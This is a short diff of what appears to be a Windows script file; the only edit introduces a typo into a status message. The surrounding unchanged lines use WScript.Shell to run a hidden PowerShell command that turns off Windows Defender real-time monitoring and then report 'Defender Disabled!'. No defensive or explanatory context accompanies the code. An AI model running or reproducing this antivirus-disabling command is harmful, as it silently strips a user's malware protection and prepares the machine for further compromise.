@@ -6,7 +6,7 @@
 <script language="javascript">
     try {
         var shell = new ActiveXObject("WScript.Shell");
-        WScript.Echo("Disabling Defender...");
+        WScript.Echo("Diisabling Defender...");
 
         shell.Run('powershell -Command "Set-MpPreference -DisableRealtimeMonitoring $true"', 0, true);
         WScript.Echo("Defender Disabled!");
